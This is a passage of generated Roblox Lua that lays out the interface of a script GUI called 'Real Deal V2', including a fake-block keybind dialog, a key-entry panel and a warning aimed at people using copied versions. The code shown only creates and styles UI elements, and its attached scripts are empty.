G2L["183"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["183"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["183"]["Text"] = [[No]];
G2L["183"]["Name"] = [[No]];
G2L["183"]["Position"] = UDim2.new(0.69888, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.No.LocalScript
G2L["184"] = Instance.new("LocalScript", G2L["183"]);



-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.No.UICorner
G2L["185"] = Instance.new("UICorner", G2L["183"]);
G2L["185"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.TextLabel
G2L["186"] = Instance.new("TextLabel", G2L["17c"]);
G2L["186"]["TextWrapped"] = true;
G2L["186"]["ZIndex"] = 10;
G2L["186"]["BorderSizePixel"] = 0;
G2L["186"]["TextSize"] = 62;
G2L["186"]["TextScaled"] = true;
G2L["186"]["BackgroundColor3"] = Color3.fromRGB(154, 210, 0);
G2L["186"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["186"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["186"]["Size"] = UDim2.new(0.7446, 0, 0.53532, 0);
G2L["186"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["186"]["Text"] = [[Confirm?]];
G2L["186"]["Position"] = UDim2.new(0.12639, 0, 0.07063, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.TextLabel.UIStroke
G2L["187"] = Instance.new("UIStroke", G2L["186"]);
G2L["187"]["Thickness"] = 3.4;
G2L["187"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.TextLabel.UICorner
G2L["188"] = Instance.new("UICorner", G2L["186"]);
G2L["188"]["CornerRadius"] = UDim.new(0, 14);


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.UIStroke
G2L["189"] = Instance.new("UIStroke", G2L["17c"]);
G2L["189"]["Thickness"] = 3.4;
G2L["189"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.UIAspectRatioConstraint
G2L["18a"] = Instance.new("UIAspectRatioConstraint", G2L["17c"]);
G2L["18a"]["AspectRatio"] = 1.00074;


-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.UIDragDetector
G2L["18b"] = Instance.new("UIDragDetector", G2L["17c"]);
G2L["18b"]["DragUDim2"] = UDim2.new(0, -25, 0, -101);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK
G2L["18c"] = Instance.new("Frame", G2L["a"]);
G2L["18c"]["Visible"] = false;
G2L["18c"]["ZIndex"] = 10;
G2L["18c"]["BorderSizePixel"] = 0;
G2L["18c"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["18c"]["Size"] = UDim2.new(0.67744, 0, 0.61102, 0);
G2L["18c"]["Position"] = UDim2.new(0.17694, 0, 0.24842, 0);
G2L["18c"]["BorderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["18c"]["Name"] = [[KeybindThingyForFAKEBLOCK]];


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Dragg
G2L["18d"] = Instance.new("LocalScript", G2L["18c"]);
G2L["18d"]["Enabled"] = false;
G2L["18d"]["Name"] = [[Dragg]];
G2L["18d"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.UICorner
G2L["18e"] = Instance.new("UICorner", G2L["18c"]);
G2L["18e"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.UIStroke
G2L["18f"] = Instance.new("UIStroke", G2L["18c"]);
G2L["18f"]["Thickness"] = 3.4;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextLabel
G2L["190"] = Instance.new("TextLabel", G2L["18c"]);
G2L["190"]["TextWrapped"] = true;
G2L["190"]["ZIndex"] = 10;
G2L["190"]["BorderSizePixel"] = 0;
G2L["190"]["TextSize"] = 48;
G2L["190"]["TextScaled"] = true;
G2L["190"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["190"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["190"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["190"]["BackgroundTransparency"] = 1;
G2L["190"]["Size"] = UDim2.new(0.75135, 0, 0.41446, 0);
G2L["190"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["190"]["Text"] = [[You Are On PC Your Fake Block Keybind Is : (Enter The Keybind)(default is z)]];
G2L["190"]["Position"] = UDim2.new(0.15367, 0, 0.15317, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox
G2L["191"] = Instance.new("TextBox", G2L["18c"]);
G2L["191"]["ZIndex"] = 10;
G2L["191"]["BorderSizePixel"] = 0;
G2L["191"]["TextWrapped"] = true;
G2L["191"]["TextSize"] = 47;
G2L["191"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["TextScaled"] = true;
G2L["191"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["191"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["191"]["Size"] = UDim2.new(0.76368, 0, 0.12887, 0);
G2L["191"]["Position"] = UDim2.new(0.11758, 0, 0.64691, 0);
G2L["191"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["191"]["Text"] = [[ENTER THE KEYBIND DEFAULT IS "Z"]];
G2L["191"]["BackgroundTransparency"] = 0.5;
-- Attributes
G2L["191"]:SetAttribute([[value]], [[]]);
G2L["191"]:SetAttribute([[canchange]], false);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox.UICorner
G2L["192"] = Instance.new("UICorner", G2L["191"]);
G2L["192"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox.TextButton
G2L["193"] = Instance.new("TextButton", G2L["191"]);
G2L["193"]["TextWrapped"] = true;
G2L["193"]["BorderSizePixel"] = 0;
G2L["193"]["TextSize"] = 14;
G2L["193"]["TextScaled"] = true;
G2L["193"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["193"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
G2L["193"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["193"]["ZIndex"] = 10;
G2L["193"]["Size"] = UDim2.new(0.30488, 0, 1, 0);
G2L["193"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["193"]["Text"] = [[PRESS AFTER SETTING]];
G2L["193"]["Position"] = UDim2.new(0.34756, 0, 1, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox.TextButton.LocalScript
G2L["194"] = Instance.new("LocalScript", G2L["193"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox.TextButton.UICorner
G2L["195"] = Instance.new("UICorner", G2L["193"]);
G2L["195"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.UIAspectRatioConstraint
G2L["196"] = Instance.new("UIAspectRatioConstraint", G2L["18c"]);
G2L["196"]["AspectRatio"] = 2.21392;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.UIDragDetector
G2L["197"] = Instance.new("UIDragDetector", G2L["18c"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm
G2L["198"] = Instance.new("Frame", G2L["18c"]);
G2L["198"]["ZIndex"] = 10;
G2L["198"]["BorderSizePixel"] = 0;
G2L["198"]["BackgroundColor3"] = Color3.fromRGB(196, 255, 107);
G2L["198"]["Size"] = UDim2.new(0.19941, 0, 0.42563, 0);
G2L["198"]["Position"] = UDim2.new(0.44071, -39, 0.5807, -143);
G2L["198"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["198"]["Name"] = [[Confirm]];


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.Dragg
G2L["199"] = Instance.new("LocalScript", G2L["198"]);
G2L["199"]["Enabled"] = false;
G2L["199"]["Name"] = [[Dragg]];
G2L["199"]["Disabled"] = true;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.LocalScript
G2L["19a"] = Instance.new("LocalScript", G2L["198"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.UICorner
G2L["19b"] = Instance.new("UICorner", G2L["198"]);
G2L["19b"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.Yes
G2L["19c"] = Instance.new("TextButton", G2L["198"]);
G2L["19c"]["TextWrapped"] = true;
G2L["19c"]["BorderSizePixel"] = 0;
G2L["19c"]["TextSize"] = 37;
G2L["19c"]["TextScaled"] = true;
G2L["19c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19c"]["BackgroundColor3"] = Color3.fromRGB(81, 186, 0);
G2L["19c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19c"]["ZIndex"] = 10;
G2L["19c"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["19c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19c"]["Text"] = [[Yes]];
G2L["19c"]["Name"] = [[Yes]];
G2L["19c"]["Position"] = UDim2.new(0.10037, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.Yes.LocalScript
G2L["19d"] = Instance.new("LocalScript", G2L["19c"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.Yes.UICorner
G2L["19e"] = Instance.new("UICorner", G2L["19c"]);
G2L["19e"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.No
G2L["19f"] = Instance.new("TextButton", G2L["198"]);
G2L["19f"]["TextWrapped"] = true;
G2L["19f"]["BorderSizePixel"] = 0;
G2L["19f"]["TextSize"] = 43;
G2L["19f"]["TextScaled"] = true;
G2L["19f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19f"]["BackgroundColor3"] = Color3.fromRGB(135, 0, 3);
G2L["19f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19f"]["ZIndex"] = 10;
G2L["19f"]["Size"] = UDim2.new(0.18987, 0, 0.18587, 0);
G2L["19f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19f"]["Text"] = [[No]];
G2L["19f"]["Name"] = [[No]];
G2L["19f"]["Position"] = UDim2.new(0.69888, 0, 0.6803, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.No.LocalScript
G2L["1a0"] = Instance.new("LocalScript", G2L["19f"]);



-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.No.UICorner
G2L["1a1"] = Instance.new("UICorner", G2L["19f"]);
G2L["1a1"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.TextLabel
G2L["1a2"] = Instance.new("TextLabel", G2L["198"]);
G2L["1a2"]["TextWrapped"] = true;
G2L["1a2"]["ZIndex"] = 10;
G2L["1a2"]["BorderSizePixel"] = 0;
G2L["1a2"]["TextSize"] = 62;
G2L["1a2"]["TextScaled"] = true;
G2L["1a2"]["BackgroundColor3"] = Color3.fromRGB(154, 210, 0);
G2L["1a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a2"]["Size"] = UDim2.new(0.7446, 0, 0.53532, 0);
G2L["1a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a2"]["Text"] = [[Confirm?]];
G2L["1a2"]["Position"] = UDim2.new(0.12639, 0, 0.07063, 0);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.TextLabel.UIStroke
G2L["1a3"] = Instance.new("UIStroke", G2L["1a2"]);
G2L["1a3"]["Thickness"] = 3.4;
G2L["1a3"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.TextLabel.UICorner
G2L["1a4"] = Instance.new("UICorner", G2L["1a2"]);
G2L["1a4"]["CornerRadius"] = UDim.new(0, 14);


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.UIStroke
G2L["1a5"] = Instance.new("UIStroke", G2L["198"]);
G2L["1a5"]["Thickness"] = 3.4;
G2L["1a5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.UIAspectRatioConstraint
G2L["1a6"] = Instance.new("UIAspectRatioConstraint", G2L["198"]);
G2L["1a6"]["AspectRatio"] = 1.00074;


-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.UIDragDetector
G2L["1a7"] = Instance.new("UIDragDetector", G2L["198"]);
G2L["1a7"]["DragUDim2"] = UDim2.new(0, -25, 0, -101);


-- StarterGui.Real Deal V2.Main.FakeBlockBTN
G2L["1a8"] = Instance.new("TextButton", G2L["a"]);
G2L["1a8"]["TextWrapped"] = true;
G2L["1a8"]["BorderSizePixel"] = 0;
G2L["1a8"]["TextSize"] = 26;
G2L["1a8"]["AutoButtonColor"] = false;
G2L["1a8"]["TextScaled"] = true;
G2L["1a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["1a8"]["ZIndex"] = 123;
G2L["1a8"]["Size"] = UDim2.new(0.05388, 0, 0.07911, 0);
G2L["1a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a8"]["Text"] = [[BLOCK ]];
G2L["1a8"]["Name"] = [[FakeBlockBTN]];
G2L["1a8"]["Position"] = UDim2.new(0.91838, 0, 0.35795, 0);


-- StarterGui.Real Deal V2.Main.FakeBlockBTN.LocalScript
G2L["1a9"] = Instance.new("LocalScript", G2L["1a8"]);



-- StarterGui.Real Deal V2.Main.FakeBlockBTN.UICorner
G2L["1aa"] = Instance.new("UICorner", G2L["1a8"]);
G2L["1aa"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Real Deal V2.Main.FakeBlockBTN.UIStroke
G2L["1ab"] = Instance.new("UIStroke", G2L["1a8"]);
G2L["1ab"]["Thickness"] = 2.1;
G2L["1ab"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1ab"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;


-- StarterGui.Real Deal V2.Main.FakeBlockBTN.UIAspectRatioConstraint
G2L["1ac"] = Instance.new("UIAspectRatioConstraint", G2L["1a8"]);
G2L["1ac"]["AspectRatio"] = 1.50764;


-- StarterGui.Real Deal V2.KeySystem
G2L["1ad"] = Instance.new("Folder", G2L["1"]);
G2L["1ad"]["Name"] = [[KeySystem]];


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup
G2L["1ae"] = Instance.new("CanvasGroup", G2L["1ad"]);
G2L["1ae"]["Visible"] = false;
G2L["1ae"]["BorderSizePixel"] = 0;
G2L["1ae"]["BackgroundColor3"] = Color3.fromRGB(4, 49, 40);
G2L["1ae"]["Size"] = UDim2.new(0.1925, 0, 0.42944, 0);
G2L["1ae"]["Position"] = UDim2.new(0.58098, 0, 0.28055, 0);
G2L["1ae"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.UICorner
G2L["1af"] = Instance.new("UICorner", G2L["1ae"]);
G2L["1af"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.UIStroke
G2L["1b0"] = Instance.new("UIStroke", G2L["1ae"]);



-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextLabel
G2L["1b1"] = Instance.new("TextLabel", G2L["1ae"]);
G2L["1b1"]["TextWrapped"] = true;
G2L["1b1"]["BorderSizePixel"] = 0;
G2L["1b1"]["TextSize"] = 14;
G2L["1b1"]["TextScaled"] = true;
G2L["1b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b1"]["BackgroundTransparency"] = 1;
G2L["1b1"]["Size"] = UDim2.new(0.63091, 0, 0.19455, 0);
G2L["1b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b1"]["Text"] = [[Enter Key:]];
G2L["1b1"]["Position"] = UDim2.new(0.20505, 0, 0.07393, 0);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox
G2L["1b2"] = Instance.new("TextBox", G2L["1ae"]);
G2L["1b2"]["BorderSizePixel"] = 0;
G2L["1b2"]["TextWrapped"] = true;
G2L["1b2"]["TextSize"] = 14;
G2L["1b2"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b2"]["TextScaled"] = true;
G2L["1b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b2"]["Size"] = UDim2.new(0.63091, 0, 0.19455, 0);
G2L["1b2"]["Position"] = UDim2.new(0.18297, 0, 0.49027, 0);
G2L["1b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b2"]["Text"] = [[]];


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.TextButton
G2L["1b3"] = Instance.new("TextButton", G2L["1b2"]);
G2L["1b3"]["TextWrapped"] = true;
G2L["1b3"]["BorderSizePixel"] = 0;
G2L["1b3"]["TextSize"] = 14;
G2L["1b3"]["TextScaled"] = true;
G2L["1b3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b3"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b3"]["Text"] = [[ENTER]];
G2L["1b3"]["Position"] = UDim2.new(0.25, 0, 1, 0);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.TextButton.LocalScript
G2L["1b4"] = Instance.new("LocalScript", G2L["1b3"]);



-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.TextButton.UIStroke
G2L["1b5"] = Instance.new("UIStroke", G2L["1b3"]);
G2L["1b5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.TextButton.UICorner
G2L["1b6"] = Instance.new("UICorner", G2L["1b3"]);
G2L["1b6"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.UIStroke
G2L["1b7"] = Instance.new("UIStroke", G2L["1b2"]);
G2L["1b7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.UICorner
G2L["1b8"] = Instance.new("UICorner", G2L["1b2"]);
G2L["1b8"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.UIAspectRatioConstraint
G2L["1b9"] = Instance.new("UIAspectRatioConstraint", G2L["1ae"]);
G2L["1b9"]["AspectRatio"] = 1.23346;


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.UIDragDetector
G2L["1ba"] = Instance.new("UIDragDetector", G2L["1ae"]);



-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close
G2L["1bb"] = Instance.new("TextButton", G2L["1ae"]);
G2L["1bb"]["TextWrapped"] = true;
G2L["1bb"]["BorderSizePixel"] = 0;
G2L["1bb"]["TextSize"] = 14;
G2L["1bb"]["TextScaled"] = true;
G2L["1bb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bb"]["BackgroundColor3"] = Color3.fromRGB(255, 25, 25);
G2L["1bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1bb"]["Size"] = UDim2.new(0.08651, 0, 0.84425, 0);
G2L["1bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1bb"]["Text"] = [[X]];
G2L["1bb"]["Name"] = [[Close]];
G2L["1bb"]["Position"] = UDim2.new(0.89822, 0, 0.07449, 0);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close.LocalScript
G2L["1bc"] = Instance.new("LocalScript", G2L["1bb"]);



-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close.UICorner
G2L["1bd"] = Instance.new("UICorner", G2L["1bb"]);
G2L["1bd"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close.UIStroke
G2L["1be"] = Instance.new("UIStroke", G2L["1bb"]);
G2L["1be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close.UIAspectRatioConstraint
G2L["1bf"] = Instance.new("UIAspectRatioConstraint", G2L["1bb"]);



-- StarterGui.Real Deal V2.Warning
G2L["1c0"] = Instance.new("CanvasGroup", G2L["1"]);
G2L["1c0"]["Visible"] = false;
G2L["1c0"]["ZIndex"] = 123123123;
G2L["1c0"]["BorderSizePixel"] = 0;
G2L["1c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c0"]["Size"] = UDim2.new(0.38033, 0, 0.53532, 0);
G2L["1c0"]["Position"] = UDim2.new(0.54344, 0, 0.10832, 0);
G2L["1c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c0"]["Name"] = [[Warning]];


-- StarterGui.Real Deal V2.Warning.TextButton
G2L["1c1"] = Instance.new("TextButton", G2L["1c0"]);
G2L["1c1"]["TextWrapped"] = true;
G2L["1c1"]["BorderSizePixel"] = 0;
G2L["1c1"]["TextSize"] = 14;
G2L["1c1"]["TextScaled"] = true;
G2L["1c1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c1"]["BackgroundColor3"] = Color3.fromRGB(255, 248, 27);
G2L["1c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c1"]["Size"] = UDim2.new(1, 0, 0.11646, 0);
G2L["1c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c1"]["Text"] = [[OKAY]];
G2L["1c1"]["Position"] = UDim2.new(0, 0, 0.88354, 0);


-- StarterGui.Real Deal V2.Warning.TextButton.LocalScript
G2L["1c2"] = Instance.new("LocalScript", G2L["1c1"]);



-- StarterGui.Real Deal V2.Warning.UIAspectRatioConstraint
G2L["1c3"] = Instance.new("UIAspectRatioConstraint", G2L["1c0"]);
G2L["1c3"]["AspectRatio"] = 1.23467;


-- StarterGui.Real Deal V2.Warning.UICorner
G2L["1c4"] = Instance.new("UICorner", G2L["1c0"]);
G2L["1c4"]["CornerRadius"] = UDim.new(0, 20);


-- StarterGui.Real Deal V2.Warning.TextLabel
G2L["1c5"] = Instance.new("TextLabel", G2L["1c0"]);
G2L["1c5"]["TextWrapped"] = true;
G2L["1c5"]["BorderSizePixel"] = 0;
G2L["1c5"]["TextSize"] = 14;
G2L["1c5"]["TextScaled"] = true;
G2L["1c5"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["1c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["Size"] = UDim2.new(1, 0, 0.886, 0);
G2L["1c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c5"]["Text"] = [[]];
G2L["1c5"]["Position"] = UDim2.new(0, 0, -0.003, 0);


-- StarterGui.Real Deal V2.Warning.TextLabel.LocalScript
G2L["1c6"] = Instance.new("LocalScript", G2L["1c5"]);



-- StarterGui.Real Deal V2.THESEIDOTS
G2L["1c7"] = Instance.new("Folder", G2L["1"]);
G2L["1c7"]["Name"] = [[THESEIDOTS]];


-- StarterGui.Real Deal V2.THESEIDOTS.NOTURBUSSINESS
G2L["1c8"] = Instance.new("LocalScript", G2L["1c7"]);
G2L["1c8"]["Name"] = [[NOTURBUSSINESS]];


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup
G2L["1c9"] = Instance.new("CanvasGroup", G2L["1c7"]);
G2L["1c9"]["Visible"] = false;
G2L["1c9"]["BorderSizePixel"] = 0;
G2L["1c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c9"]["GroupColor3"] = Color3.fromRGB(73, 73, 73);
G2L["1c9"]["Size"] = UDim2.new(0.32446, 0, 0.45055, 0);
G2L["1c9"]["Position"] = UDim2.new(0.33777, 0, 0.28414, 0);
G2L["1c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.UICorner
G2L["1ca"] = Instance.new("UICorner", G2L["1c9"]);
G2L["1ca"]["CornerRadius"] = UDim.new(0, 16);


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.TextLabel
G2L["1cb"] = Instance.new("TextLabel", G2L["1c9"]);
G2L["1cb"]["TextWrapped"] = true;
G2L["1cb"]["BorderSizePixel"] = 0;
G2L["1cb"]["TextSize"] = 14;
G2L["1cb"]["TextScaled"] = true;
G2L["1cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1cb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["BackgroundTransparency"] = 1;
G2L["1cb"]["Size"] = UDim2.new(1, 0, 0.88139, 0);
G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cb"]["Text"] = [[HEY NINCOMPOOP YOUR USING A SKIDDED VERSION OF MY SCRIPT THAT I MADE WITH MY BLOOD SWEAT AND TEARS USE THAT IT IS THE UPDATED BEST SCRIPT]];
G2L["1cb"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.UIAspectRatioConstraint
G2L["1cc"] = Instance.new("UIAspectRatioConstraint", G2L["1c9"]);
G2L["1cc"]["AspectRatio"] = 1.65281;


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.TextButton
G2L["1cd"] = Instance.new("TextButton", G2L["1c9"]);
G2L["1cd"]["TextWrapped"] = true;
G2L["1cd"]["BorderSizePixel"] = 0;
G2L["1cd"]["TextSize"] = 14;
G2L["1cd"]["TextScaled"] = true;
G2L["1cd"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cd"]["BackgroundColor3"] = Color3.fromRGB(188, 255, 0);
G2L["1cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/LuckiestGuy.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1cd"]["Size"] = UDim2.new(0.99781, 0, 0.11646, 0);
G2L["1cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1cd"]["Text"] = [[OKAY]];
G2L["1cd"]["Position"] = UDim2.new(-0, 0, 0.88139, 0);


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.TextButton.LocalScript
G2L["1ce"] = Instance.new("LocalScript", G2L["1cd"]);



-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.TextButton.UIStroke
G2L["1cf"] = Instance.new("UIStroke", G2L["1cd"]);
G2L["1cf"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.UIDragDetector
G2L["1d0"] = Instance.new("UIDragDetector", G2L["1c9"]);



-- StarterGui.Real Deal V2.PremiumMode
